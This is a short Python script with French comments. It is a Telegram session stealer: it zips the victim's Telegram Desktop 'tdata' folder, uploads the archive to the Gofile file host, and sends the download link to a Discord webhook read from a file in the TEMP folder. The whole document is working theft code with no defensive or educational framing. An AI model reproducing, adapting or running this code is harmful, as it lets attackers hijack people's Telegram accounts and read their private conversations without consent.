import os
import json
import requests
import shutil
import tempfile
import zipfile

# Chemin du dossier Telegram tdata
tdata_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")

# Vérification de l'existence du dossier
if not os.path.exists(tdata_path):
    print("Le dossier tdata est introuvable.")
    exit()

# Création d'un fichier ZIP temporaire
temp_dir = tempfile.gettempdir()
zip_path = os.path.join(temp_dir, "tdata.zip")

with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
    for root, _, files in os.walk(tdata_path):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, tdata_path)
            zipf.write(file_path, arcname)

print(f"Dossier tdata zippé : {zip_path}")

# Récupération d'un serveur Gofile
server_response = requests.get("https://api.gofile.io/servers")
server_data = server_response.json()

if server_data["status"] != "ok":
    print("Erreur lors de la récupération du serveur.")
    exit()

server_name = server_data["data"]["servers"][0]["name"]
print(f"Serveur sélectionné : {server_name}")

# Envoi du fichier sur Gofile
with open(zip_path, "rb") as file:
    files = {"file": file}
    upload_response = requests.post(f"https://{server_name}.gofile.io/contents/uploadfile", files=files)

upload_data = upload_response.json()

if upload_data["status"] != "ok":
    print(f"Erreur lors de l'upload : {upload_data}")
    exit()

file_link = upload_data["data"]["downloadPage"]
print(f"Fichier envoyé avec succès : {file_link}")

# Lecture du webhook depuis le fichier
webhook_path = os.path.join(os.getenv("TEMP"), "config", "webhook.txt")

if os.path.exists(webhook_path):
    with open(webhook_path, "r") as f:
        webhook_url = f.read().strip()

    # Envoi du message sur Discord
    payload = {"content": f"📂 Fichier uploadé : {file_link}"}
    response_discord = requests.post(webhook_url, json=payload)

    if response_discord.status_code == 204:
        print("Lien envoyé sur Discord avec succès.")
    else:
        print(f"Erreur lors de l'envoi sur Discord : {response_discord.status_code}")
else:
    print("Le fichier webhook.txt est introuvable.")
